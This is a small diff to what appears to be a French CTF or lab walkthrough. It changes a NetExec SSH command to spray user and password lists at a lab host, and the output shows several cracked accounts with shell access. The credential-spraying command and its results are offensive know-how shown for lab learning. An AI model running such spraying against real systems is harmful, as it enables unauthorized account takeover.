@@ -241,7 +241,7 @@ Apres avoir trouver les `user` & `password` dans la base de donnée , essayons d
 
 ```
 ┌─[parrot@parrot]─[~]
-└──╼ $nxc ssh 192.168.56.21 -u user -p pass --no-bruteforce --continue-on-success --sudo-check
+└──╼ $nxc ssh 192.168.56.21 -u user.txt -p pass.txt --no-bruteforce --continue-on-success --sudo-check
 SSH         192.168.56.21   22     192.168.56.21    [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
 SSH         192.168.56.21   22     192.168.56.21    [+] leia_organa:help_me_obiwan (Pwn3d!) Linux - Shell access!
 SSH         192.168.56.21   22     192.168.56.21    [+] luke_skywalker:like_my_father_beforeme (Pwn3d!) Linux - Shell access!
